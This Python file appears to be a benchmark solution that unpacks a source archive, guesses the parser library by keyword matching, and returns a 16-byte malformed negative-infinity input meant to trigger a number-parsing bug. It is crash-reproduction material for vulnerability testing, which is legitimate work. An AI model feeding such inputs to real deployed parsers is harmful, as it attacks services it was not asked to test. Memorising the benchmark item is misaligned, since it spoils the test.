import os
import tarfile
import tempfile
import shutil
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
            # Heuristic detection of project to tailor payload
            files = []
            for root, _, fnames in os.walk(tmpdir):
                for f in fnames:
                    p = os.path.join(root, f)
                    try:
                        if os.path.getsize(p) < 2_000_000:
                            files.append(p)
                    except Exception:
                        pass

            content_sample = ""
            for p in files:
                name = os.path.basename(p).lower()
                low = ""
                try:
                    if p.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh", ".m", ".mm", ".rs", ".go", ".py", ".java", ".txt")):
                        with open(p, "r", errors="ignore") as fh:
                            low = fh.read()
                    else:
                        continue
                except Exception:
                    continue
                content_sample += low[:20000].lower()

            def has_any(*words):
                return any(w in content_sample for w in words)

            # Craft inputs based on heuristics
            # The vulnerability mentions minus sign + infinity parsing mishandling.
            # Provide inputs that start with a minus and a near-infinity token that is intentionally invalid.
            # Keep around 16 bytes where feasible.

            # YAML often supports .inf and .nan
            if has_any("yaml.h", "libyaml", "yaml_parser", "yaml_emitter", "yaml_"):
                # Malformed negative infinity in YAML-like scalar
                # Intentionally not ".inf", to trigger the bad path described
                payload = b"-.infX\n-\n#x\n"
                # Ensure ~16 bytes
                payload = payload[:16].ljust(16, b" ")
                return payload

            # JSON-like parsers (json-c, yyjson, rapidjson, simdjson extensions)
            if has_any("json_tokener", "json_object", "json-c", "yyjson", "rapidjson", "simdjson", "json::", "nlohmann", "jansson", "json_parse"):
                # JSON usually doesn't accept Infinity but some parsers do as extension.
                # Use an intentionally invalid near-Infinity token after minus.
                payload = b"[-Infinitx]\n"
                payload = payload[:16].ljust(16, b" ")
                return payload

            # TOML parsers often accept inf/nan extensions
            if has_any("toml", "tomlc", "toml11", "toml::parse", "toml_parse"):
                payload = b"a=-infinx\n"
                payload = payload[:16].ljust(16, b" ")
                return payload

            # JavaScript engines (duktape, mujs, quickjs, jerryscript) accept -Infinity
            if has_any("duktape", "duk_", "jerryscript", "jerry-core", "quickjs", "mujs", "jsvalue", "js_parse"):
                payload = b"-Infinityx;\n"
                payload = payload[:16].ljust(16, b" ")
                return payload

            # XML/XPath libs sometimes parse infinity-like tokens in number conversion
            if has_any("pugixml", "tinyxml", "libxml", "xmlparse", "xpath", "xmlreader", "expat"):
                payload = b"<a>-InfX</a>\n"
                payload = payload[:16].ljust(16, b" ")
                return payload

            # YAML fallback again if undecided; it's a common text format in OSS-Fuzz targets.
            payload = b"-.infXX\n-\n#\n"
            payload = payload[:16].ljust(16, b" ")
            return payload
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)